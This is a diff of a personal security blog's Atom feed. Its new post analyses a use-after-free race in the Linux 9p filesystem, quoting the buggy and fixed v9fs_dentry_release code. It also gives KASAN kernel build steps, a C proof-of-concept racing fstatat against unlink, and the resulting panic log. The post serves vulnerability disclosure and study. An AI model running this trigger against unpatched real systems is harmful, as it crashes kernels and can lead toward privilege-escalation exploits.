@@ -1,6 +1,1002 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-29T16:26:20+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">My interesting researches</title><subtitle>I share what I find interesting here..</subtitle><entry><title type="html">ImageIO, the infamous iOS Zero Click Attack Vector.</title><link href="http://localhost:4000/fuzzing/2024/03/29/iOSImageIO.html" rel="alternate" type="text/html" title="ImageIO, the infamous iOS Zero Click Attack Vector." /><published>2024-03-29T10:27:59+01:00</published><updated>2024-03-29T10:27:59+01:00</updated><id>http://localhost:4000/fuzzing/2024/03/29/iOSImageIO</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/03/29/iOSImageIO.html"><![CDATA[<p>ImageIO is Apple’s Framework that handles image parsing, which exposes 0click attack surface</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-29T16:35:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">My interesting researches</title><subtitle>I share what I find interesting here..</subtitle><entry><title type="html">Race Condition in 9p file system.</title><link href="http://localhost:4000/fuzzing/2024/05/29/Race-into-9p.html" rel="alternate" type="text/html" title="Race Condition in 9p file system." /><published>2024-05-29T02:01:01+02:00</published><updated>2024-05-29T02:01:01+02:00</updated><id>http://localhost:4000/fuzzing/2024/05/29/Race%20into%209p</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/05/29/Race-into-9p.html"><![CDATA[<p><a href="https://lore.kernel.org/linux-kernel/ZlaC1Sn6WZtEGsbK@codewreck.org/T/">from commit message</a> there is a use-after-free on dentry’s d_fsdata fid list when a thread
+looks up a fid through dentry while another thread unlinks it:</p>
 
-<p>Months after reading <a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">this blog post from Google Project Zero</a> about fuzzing in ImageIO, I used LLDB to examine the testHeader functions, it turned out three new <mark>testHeader</mark> functions for different file formats.</p>
+<p>UAF thread:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">refcount_t: addition on 0<span class="p">;</span> use-after-free.
+ p9_fid_get linux/./include/net/9p/client.h:262
+ v9fs_fid_find+0x236/0x280 linux/fs/9p/fid.c:129
+ v9fs_fid_lookup_with_uid linux/fs/9p/fid.c:181
+ v9fs_fid_lookup+0xbf/0xc20 linux/fs/9p/fid.c:314
+ v9fs_vfs_getattr_dotl+0xf9/0x360 linux/fs/9p/vfs_inode_dotl.c:400
+ vfs_statx+0xdd/0x4d0 linux/fs/stat.c:248</code></pre></figure>
+
+<p>Freed by:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"> p9_fid_destroy <span class="o">(</span>inlined<span class="o">)</span>
+ p9_client_clunk+0xb0/0xe0 linux/net/9p/client.c:1456
+ p9_fid_put linux/./include/net/9p/client.h:278
+ v9fs_dentry_release+0xb5/0x140 linux/fs/9p/vfs_dentry.c:55
+ v9fs_remove+0x38f/0x620 linux/fs/9p/vfs_inode.c:518
+ vfs_unlink+0x29a/0x810 linux/fs/namei.c:4335</code></pre></figure>
+
+<p>The problem is that d_fsdata was not accessed under d_lock, because
+d_release() normally is only called once the dentry is otherwise no
+longer accessible but since we also call it explicitly in v9fs_remove
+that lock is required:
+move the hlist out of the dentry under lock then unref its fids once
+they are no longer accessible.</p>
+
+<p><a href="https://github.com/torvalds/linux/blob/e0cce98fe279b64f4a7d81b7f5c3a23d80b92fbc/fs/9p/vfs_dentry.c#L48">/fs/9p/vfs_dentry.c</a></p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">void</span> <span class="nf">v9fs_dentry_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="nc">hlist_node</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
+
+	<span class="n">p9_debug</span><span class="p">(</span><span class="n">P9_DEBUG_VFS</span><span class="p">,</span> <span class="s">" dentry: %pd (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+		 <span class="n">dentry</span><span class="p">,</span> <span class="n">dentry</span><span class="p">);</span>
+	<span class="n">hlist_for_each_safe</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">hlist_head</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span><span class="p">)</span>
+		<span class="n">p9_fid_put</span><span class="p">(</span><span class="n">hlist_entry</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">p9_fid</span><span class="p">,</span> <span class="n">dlist</span><span class="p">));</span>
+	<span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>fix:
+<a href="https://github.com/martinetd/linux/commit/c898afdc15645efb555acb6d85b484eb40a45409">/fs/9p/vfs_dentry.c</a></p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">void</span> <span class="nf">v9fs_dentry_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="nc">hlist_node</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="nc">hlist_head</span> <span class="n">head</span><span class="p">;</span>
+
+	<span class="n">p9_debug</span><span class="p">(</span><span class="n">P9_DEBUG_VFS</span><span class="p">,</span> <span class="s">" dentry: %pd (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+		 <span class="n">dentry</span><span class="p">,</span> <span class="n">dentry</span><span class="p">);</span>
+
+	<span class="n">spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_lock</span><span class="p">);</span>
+	<span class="n">hlist_move_list</span><span class="p">((</span><span class="k">struct</span> <span class="nc">hlist_head</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">head</span><span class="p">);</span>
+	<span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_lock</span><span class="p">);</span>
+
+	<span class="n">hlist_for_each_safe</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">head</span><span class="p">)</span>
+		<span class="n">p9_fid_put</span><span class="p">(</span><span class="n">hlist_entry</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">p9_fid</span><span class="p">,</span> <span class="n">dlist</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>to run the poc first build the kernel and run it via virtio</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">git clone <span class="nt">--depth</span> 1 https://github.com/torvalds/linux.git
+git clone <span class="nt">--depth</span> 1 https://github.com/amluto/virtme.git
+<span class="nb">cd </span>linux
+../virtme/virtme-configkernel  <span class="nt">--defconfig</span>
+/scripts/config <span class="nt">-e</span> KASAN <span class="nt">-e</span> KASAN_INLINE <span class="nt">-e</span> WARNING
+make </code></pre></figure>
+
+<p>then inside the shell run the following code.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">dirfd</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filePath</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">ThreadArgs</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">statThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ThreadArgs</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">ThreadArgs</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">stat</span> <span class="n">buf</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">outFile</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">retval</span> <span class="o">=</span> <span class="n">fstatat</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">dirfd</span><span class="p">,</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="n">outFile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">outFile</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">fclose</span><span class="p">(</span><span class="n">outFile</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">unlinkThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ThreadArgs</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">ThreadArgs</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"!!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">unlink</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span> <span class="n">threads</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">dirfd</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dirPath</span> <span class="o">=</span> <span class="s">"."</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filePath</span> <span class="o">=</span> <span class="s">"example.txt"</span><span class="p">;</span>
+    <span class="n">ThreadArgs</span> <span class="n">args</span><span class="p">;</span>
+
+    <span class="c1">// Open the directory file descriptor</span>
+    <span class="n">dirfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">dirPath</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dirfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to open directory"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">args</span><span class="p">.</span><span class="n">dirfd</span> <span class="o">=</span> <span class="n">dirfd</span><span class="p">;</span>
+    <span class="n">args</span><span class="p">.</span><span class="n">filePath</span> <span class="o">=</span> <span class="n">filePath</span><span class="p">;</span>
+
+    <span class="c1">// Create the stat and unlink threads</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">threads</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">statThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to create stat thread"</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">threads</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">unlinkThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to create unlink thread"</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Wait for both threads to finish (which they never will in this setup)</span>
+    <span class="n">pthread_join</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">pthread_join</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>panic log:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">[</span>   17.000245] BUG: KASAN: slab-use-after-free <span class="k">in </span>p9_client_getattr_dotl+0x170/0x190
+<span class="o">[</span>   17.000938] Read of size 8 at addr ffff88810590ad00 by task 9poc/151
+
+<span class="o">[</span>   17.001713] CPU: 2 PID: 151 Comm: 9poc Tainted: G        W          6.8.0 <span class="c">#83</span>
+<span class="o">[</span>   17.002433] Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.15.0-1 04/01/2014
+<span class="o">[</span>   17.003866] Call Trace:
+<span class="o">[</span>   17.004259]  &lt;TASK&gt;
+<span class="o">[</span>   17.004720]  dump_stack_lvl+0x4b/0x80
+<span class="o">[</span>   17.005263]  print_report+0x106/0x650
+<span class="o">[</span>   17.005722]  ? p9_client_getattr_dotl+0x170/0x190
+<span class="o">[</span>   17.006201]  kasan_report+0xbe/0xf0
+<span class="o">[</span>   17.006568]  ? p9_client_getattr_dotl+0x170/0x190
+<span class="o">[</span>   17.007059]  p9_client_getattr_dotl+0x170/0x190
+<span class="o">[</span>   17.007579]  v9fs_vfs_getattr_dotl+0x115/0x370
+<span class="o">[</span>   17.008033]  vfs_statx+0x100/0x460
+<span class="o">[</span>   17.008450]  ? __pfx_vfs_statx+0x10/0x10
+<span class="o">[</span>   17.008854]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.009315]  ? getname_flags.part.0+0xb4/0x450
+<span class="o">[</span>   17.009719]  vfs_fstatat+0x8e/0xc0
+<span class="o">[</span>   17.010094]  __do_sys_newfstatat+0x6b/0xc0
+<span class="o">[</span>   17.010547]  ? __pfx___do_sys_newfstatat+0x10/0x10
+<span class="o">[</span>   17.010989]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.011340]  ? lockdep_hardirqs_on_prepare+0x277/0x410
+<span class="o">[</span>   17.011861]  do_syscall_64+0xcc/0x1e0
+<span class="o">[</span>   17.012303]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+<span class="o">[</span>   17.012743] RIP: 0033:0x7f3d8fd50d3e
+<span class="o">[</span>   17.013134] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 &lt;3d&gt; 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
+<span class="o">[</span>   17.014874] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
+<span class="o">[</span>   17.015543] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
+<span class="o">[</span>   17.016198] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
+<span class="o">[</span>   17.016831] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
+<span class="o">[</span>   17.017506] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
+<span class="o">[</span>   17.018138] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
+<span class="o">[</span>   17.018788]  &lt;/TASK&gt;
+
+<span class="o">[</span>   17.019363] Allocated by task 151:
+<span class="o">[</span>   17.019686]  kasan_save_stack+0x24/0x50
+<span class="o">[</span>   17.020093]  kasan_save_track+0x14/0x30
+<span class="o">[</span>   17.020553]  __kasan_kmalloc+0x7f/0x90
+<span class="o">[</span>   17.020891]  p9_fid_create+0x3e/0x3a0
+<span class="o">[</span>   17.021300]  p9_client_walk+0xa4/0x440
+<span class="o">[</span>   17.021740]  v9fs_vfs_atomic_open_dotl+0x357/0x8b0
+<span class="o">[</span>   17.022165]  lookup_open.isra.0+0x991/0x1550
+<span class="o">[</span>   17.022568]  path_openat+0x86b/0x22f0
+<span class="o">[</span>   17.022993]  do_filp_open+0x1b0/0x3e0
+<span class="o">[</span>   17.023383]  do_sys_openat2+0x11d/0x160
+<span class="o">[</span>   17.023725]  __x64_sys_openat+0x11e/0x1e0
+<span class="o">[</span>   17.024095]  do_syscall_64+0xcc/0x1e0
+<span class="o">[</span>   17.024445]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+<span class="o">[</span>   17.025218] Freed by task 152:
+<span class="o">[</span>   17.025506]  kasan_save_stack+0x24/0x50
+<span class="o">[</span>   17.025909]  kasan_save_track+0x14/0x30
+<span class="o">[</span>   17.026370]  kasan_save_free_info+0x3b/0x60
+<span class="o">[</span>   17.026762]  __kasan_slab_free+0x106/0x190
+<span class="o">[</span>   17.027176]  kfree+0xe1/0x300
+<span class="o">[</span>   17.027555]  p9_client_clunk+0x93/0xe0
+<span class="o">[</span>   17.027948]  v9fs_dentry_release+0xb4/0x140
+<span class="o">[</span>   17.028437]  v9fs_remove+0x31a/0x4c0
+<span class="o">[</span>   17.028774]  vfs_unlink+0x29e/0x810
+<span class="o">[</span>   17.029149]  do_unlinkat+0x425/0x5c0
+<span class="o">[</span>   17.029579]  __x64_sys_unlink+0xa4/0xe0
+<span class="o">[</span>   17.029930]  do_syscall_64+0xcc/0x1e0
+<span class="o">[</span>   17.030334]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+<span class="o">[</span>   17.031059] The buggy address belongs to the object at ffff88810590ad00
+                which belongs to the cache kmalloc-96 of size 96
+<span class="o">[</span>   17.032134] The buggy address is located 0 bytes inside of
+                freed 96-byte region <span class="o">[</span>ffff88810590ad00, ffff88810590ad60<span class="o">)</span>
+
+<span class="o">[</span>   17.033506] The buggy address belongs to the physical page:
+<span class="o">[</span>   17.033998] page:00000000d4ba65e2 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10590a
+<span class="o">[</span>   17.034817] flags: 0x200000000000800<span class="o">(</span>slab|node<span class="o">=</span>0|zone<span class="o">=</span>2<span class="o">)</span>
+<span class="o">[</span>   17.035307] page_type: 0xffffffff<span class="o">()</span>
+<span class="o">[</span>   17.035623] raw: 0200000000000800 ffff888100042780 dead000000000122 0000000000000000
+<span class="o">[</span>   17.036358] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
+<span class="o">[</span>   17.037164] page dumped because: kasan: bad access detected
+
+<span class="o">[</span>   17.037830] Memory state around the buggy address:
+<span class="o">[</span>   17.038281]  ffff88810590ac00: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
+<span class="o">[</span>   17.038925]  ffff88810590ac80: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
+<span class="o">[</span>   17.039756] <span class="o">&gt;</span>ffff88810590ad00: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
+<span class="o">[</span>   17.040437]                    ^
+<span class="o">[</span>   17.040735]  ffff88810590ad80: <span class="nb">fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span>
+<span class="o">[</span>   17.041420]  ffff88810590ae00: <span class="nb">fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span>
+<span class="o">[</span>   17.042213] <span class="o">==================================================================</span>
+<span class="o">[</span>   17.042872] Disabling lock debugging due to kernel taint
+<span class="o">[</span>   17.043615] general protection fault, probably <span class="k">for </span>non-canonical address 0xe0000be7b1d87003: 0000 <span class="o">[</span><span class="c">#1] PREEMPT SMP KASAN NOPTI</span>
+<span class="o">[</span>   17.044955] KASAN: probably user-memory-access <span class="k">in </span>range <span class="o">[</span>0x00007f3d8ec38018-0x00007f3d8ec3801f]
+<span class="o">[</span>   17.045905] CPU: 2 PID: 151 Comm: 9poc Tainted: G    B   W          6.8.0 <span class="c">#83</span>
+<span class="o">[</span>   17.046762] Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.15.0-1 04/01/2014
+<span class="o">[</span>   17.047749] RIP: 0010:p9_client_rpc+0xe2/0x940
+<span class="o">[</span>   17.048310] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 <span class="nb">fc </span>ff <span class="nb">df </span>49 8d 7d 1c 48 89 fa 48 c1 ea 03 &lt;0f&gt; b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
+<span class="o">[</span>   17.049932] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
+<span class="o">[</span>   17.050497] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
+<span class="o">[</span>   17.051172] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
+<span class="o">[</span>   17.052007] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
+<span class="o">[</span>   17.052845] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
+<span class="o">[</span>   17.053656] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
+<span class="o">[</span>   17.054464] FS:  00007f3d8fc39640<span class="o">(</span>0000<span class="o">)</span> GS:ffff8881f6f00000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
+<span class="o">[</span>   17.055413] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+<span class="o">[</span>   17.056081] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0
+<span class="o">[</span>   17.056930] Call Trace:
+<span class="o">[</span>   17.057238]  &lt;TASK&gt;
+<span class="o">[</span>   17.057532]  ? die_addr+0x3c/0xa0
+<span class="o">[</span>   17.057981]  ? exc_general_protection+0x149/0x220
+<span class="o">[</span>   17.058556]  ? asm_exc_general_protection+0x26/0x30
+<span class="o">[</span>   17.059206]  ? p9_client_rpc+0x89e/0x940
+<span class="o">[</span>   17.059654]  ? p9_client_rpc+0xe2/0x940
+<span class="o">[</span>   17.060134]  ? p9_client_rpc+0x89e/0x940
+<span class="o">[</span>   17.060637]  ? __pfx_p9_client_rpc+0x10/0x10
+<span class="o">[</span>   17.061158]  ? add_taint+0x55/0x90
+<span class="o">[</span>   17.061540]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.062038]  ? add_taint+0x25/0x90
+<span class="o">[</span>   17.062455]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.062948]  ? end_report+0x7e/0x130
+<span class="o">[</span>   17.063376]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.063884]  ? p9_client_getattr_dotl+0x170/0x190
+<span class="o">[</span>   17.064450]  p9_client_getattr_dotl+0xb0/0x190
+<span class="o">[</span>   17.065000]  v9fs_vfs_getattr_dotl+0x115/0x370
+<span class="o">[</span>   17.065523]  vfs_statx+0x100/0x460
+<span class="o">[</span>   17.065911]  ? __pfx_vfs_statx+0x10/0x10
+<span class="o">[</span>   17.066374]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.066879]  ? getname_flags.part.0+0xb4/0x450
+<span class="o">[</span>   17.067424]  vfs_fstatat+0x8e/0xc0
+<span class="o">[</span>   17.067897]  __do_sys_newfstatat+0x6b/0xc0
+<span class="o">[</span>   17.068371]  ? __pfx___do_sys_newfstatat+0x10/0x10
+<span class="o">[</span>   17.068961]  ? srso_return_thunk+0x5/0x5f
+<span class="o">[</span>   17.069398]  ? lockdep_hardirqs_on_prepare+0x277/0x410
+<span class="o">[</span>   17.069878]  do_syscall_64+0xcc/0x1e0
+<span class="o">[</span>   17.070329]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+<span class="o">[</span>   17.070903] RIP: 0033:0x7f3d8fd50d3e
+<span class="o">[</span>   17.071370] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 &lt;3d&gt; 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
+<span class="o">[</span>   17.073026] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
+<span class="o">[</span>   17.073783] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
+<span class="o">[</span>   17.074440] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
+<span class="o">[</span>   17.075263] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
+<span class="o">[</span>   17.076061] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
+<span class="o">[</span>   17.076893] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
+<span class="o">[</span>   17.077665]  &lt;/TASK&gt;
+<span class="o">[</span>   17.077960] Modules linked <span class="k">in</span>:
+<span class="o">[</span>   17.078409] <span class="nt">---</span><span class="o">[</span> end trace 0000000000000000 <span class="o">]</span><span class="nt">---</span>
+<span class="o">[</span>   17.078857] RIP: 0010:p9_client_rpc+0xe2/0x940
+<span class="o">[</span>   17.079272] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 <span class="nb">fc </span>ff <span class="nb">df </span>49 8d 7d 1c 48 89 fa 48 c1 ea 03 &lt;0f&gt; b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
+<span class="o">[</span>   17.081015] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
+<span class="o">[</span>   17.081545] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
+<span class="o">[</span>   17.082185] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
+<span class="o">[</span>   17.082876] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
